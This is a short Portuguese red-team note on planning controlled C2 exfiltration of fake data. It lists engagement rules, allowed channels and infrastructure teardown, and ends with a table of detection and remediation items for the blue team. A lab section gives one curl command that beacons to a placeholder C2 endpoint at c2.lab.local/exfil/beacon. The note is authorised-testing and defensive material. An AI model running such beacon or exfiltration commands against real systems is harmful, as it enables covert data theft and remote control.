# exfil controlada de dados fake

## Contexto

C2 em red team deve priorizar ROE, kill-switch, allowlists de beacon e evitar
impacto em disponibilidade. OpSec inclui metadados de infraestrutura, categorificação de domínios
e alinhamento com detection goals do purple team.

## Detalhe

- Se não validar **Prove canal**, a nota fica genérica.

## Execução

1. Definir canais permitidos (HTTPS, DNS, etc.).
2. Infra com segregação e burndown plan.
3. Payloads assinados apenas em alvos autorizados.
4. Telemetria mínima necessária para objetivos.
5. Desmobilizar infra ao final.

## No lab ficou assim

```bash
# C2 lab — kill-switch e janela
curl -sk https://c2.lab.local/exfil/beacon -H 'X-Session: cefac7'
# só conta teste; sem persistência fora do ROE
```

## OpSec

Não uso infra de C2 criminal. Não aponte para fora do escopo.

## Cuidados

Não uso infra de C2 criminal. Não aponte para fora do escopo.

## Fechamento

| | |
|---|---|
| Detecção | CDN/proxy anomalies; beacon jitter patterns; JA3. |
| Remediação | Allowlist egress; TLS inspection onde adequado; DNS control. |
| Evidência | Diagrama de infra; IOCs entregues ao blue; timeline. |

## Refs

- Red Team Field Manual ethics
- MITRE C2